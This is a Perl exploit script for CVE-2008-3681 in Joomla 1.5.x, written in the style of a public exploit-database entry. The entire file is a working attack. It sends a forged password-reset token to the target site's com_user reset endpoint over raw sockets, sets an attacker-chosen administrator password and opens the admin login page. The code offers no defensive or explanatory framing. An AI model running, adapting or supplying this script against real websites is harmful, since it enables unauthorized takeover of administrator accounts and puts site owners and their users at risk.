#Exploit Title: Joomla 1.5.x (Token) Remote Admin Change Password Vulnerability (perl)
#Date: 27/01/2013
#Exploit Author: D35m0nd142
#Vendor Homepage: http://www.joomla.org/
#CVE: 2008-3681
#Thanks to d3m0n
#Some parameters are variables (like cookies,User-Agent,PeerPort ...)
#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common;
use IO::Socket::INET;
system("");
print "\n\n";
$agent = LWP::UserAgent->new();
$agent->agent('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0');
$target = $ARGV[0];
$newpass = $ARGV[1];
if($target eq '' || $newpass eq '')
{
sleep 0.3;
exit(1);
}

if($target !~ /http:\/\//)
{
$target = "http://$target";
}

$host = $target . "/index.php?option=com_user&view=reset&layout=confirm" ;
$body = "token=%27&d851e0ec18898263d9e5ae9de61dd519=1";
print "$host\n\n";
$length = length $body;
$body = "$body\r\n\r\n";
sleep 1;
print "[*] Testing if website exists ...\n";
$req = $agent->request(HTTP::Request->new(GET=>$host));
if ($req->is_success)
{
print "Website exists . \n\n";
print "Exploiting Joomla website . . wait please . . \n";
sleep 1.5;
print "[*] Sending malicious token on $host\n\n";
sleep 0.5;
$sock = IO::Socket::INET->new(PeerAddr => "$ARGV[0]", PeerPort => 'http(80)', Proto => 'tcp');
print $sock "POST /index.php?option=com_user&task=confirmreset HTTP/1.1\r\n";
print $sock "Host:$ARGV[0]\r\n";
print $sock "User-Agent:BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0\r\n";
print $sock "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
print $sock "Accept-Language: en-US,en;q=0.5\r\n";
print $sock "Accept-Encoding: gzip, deflate\r\n";
print $sock "Referer: $host\r\n";
print $sock "Cookie: __utma=194891897.1942900790.1359225585.1359234394.1359278693.3; __utmz=194891897.1359225585.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); 9449e28969660ef964b805af19d964a8=820cd28c8b1b5326299f67c549acee86; __utmb=194891897.1.10.1359278693; __utmc=194891897\r\n";
print $sock "Connection: keep-alive\r\n";
print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
print $sock "Content-Length:$length\r\n";
print $sock $body ;
close($sock); 

$body1 = "password1=$newpass&password2=$newpass&d851e0ec18898263d9e5ae9de61dd519=1";
$length1 = length $body1;
$body1 = "$body1\r\n\r\n";
$host = $target . "/index.php?option=com_user&view=reset&layout=complete";
print "[*] Sending '$newpass' as new admin panel password\n\n";
sleep 1;
$sock2 = IO::Socket::INET->new(PeerAddr => "$ARGV[0]", PeerPort => 'http(80)' , Proto => 'tcp');
print $sock2 "POST /index.php?option=com_user&task=completereset HTTP/1.1\r\n";
print $sock2 "Host:$target\r\n";
print $sock2 "User-Agent:BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0\r\n";
print $sock2 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
print $sock2 "Accept-Language: en-US,en;q=0.5\r\n";
print $sock2 "Accept-Encoding: gzip, deflate\r\n";
print $sock2 "Referer:$host\r\n";
print $sock2 "Cookie: __utma=194891897.1942900790.1359225585.1359234394.1359278693.3; __utmz=194891897.1359225585.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); 9449e28969660ef964b805af19d964a8=820cd28c8b1b5326299f67c549acee86; __utmb=194891897.2.10.1359278693; __utmc=194891897\r\n";
print $sock2 "Connection: keep-alive\r\n";
print $sock2 "Content-Type: application/x-www-form-urlencoded\r\n";
print $sock2 "Content-Length:$length1\r\n";
print $sock2 $body1;
close($sock2);

sleep 2;
print "[+] Exploit sent successfully. \nTry to login in admin page --> $target/administrator \n\n";
$webadmin = "$target/administrator";
$cmd = "firefox $webadmin";
system($cmd);
}

else 
{
print "[!] Website does not exist or is not currently accessible .\n\n";
}